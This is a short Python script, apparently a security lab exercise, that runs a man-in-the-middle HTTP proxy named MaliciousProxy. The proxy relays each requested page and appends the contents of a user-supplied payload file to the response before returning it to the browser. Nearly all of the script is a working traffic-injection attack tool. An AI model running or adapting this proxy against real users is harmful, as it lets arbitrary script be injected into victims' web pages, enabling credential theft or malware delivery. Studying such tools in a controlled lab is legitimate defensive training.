import http.server
import urllib.response
import urllib.request
import socketserver
import sys

if len(sys.argv) < 3:
		print('Usage: python3 mitm.py <port> <payload file>')
		exit(1)
		
class MaliciousProxy(http.server.SimpleHTTPRequestHandler):

		def do_GET(self):
		
				print('[*] Got request for: {}'.format(self.path))
				
				# Your code will go here

				resp = urllib.request.urlopen(self.path)
				
				resp_data = resp.read()
				page_content = resp_data.decode("UTF-8")
				
				#print(bytes(payload,'UTF-8'))
				f = open(sys.argv[2],"r")
				lines = f.readlines()
				f.close()
				payload = ''
				
				for line in lines:
						tmpline = line.replace("\n","")
						payload+=tmpline
						
				self.send_response(200)
				self.end_headers()
				self.wfile.write(resp_data + bytes(payload,'UTF-8'))
				
				
				
port = int(sys.argv[1])
server = socketserver.ThreadingTCPServer(('', port), MaliciousProxy)
print("[*] Serving on port {}".format(port))
server.serve_forever()
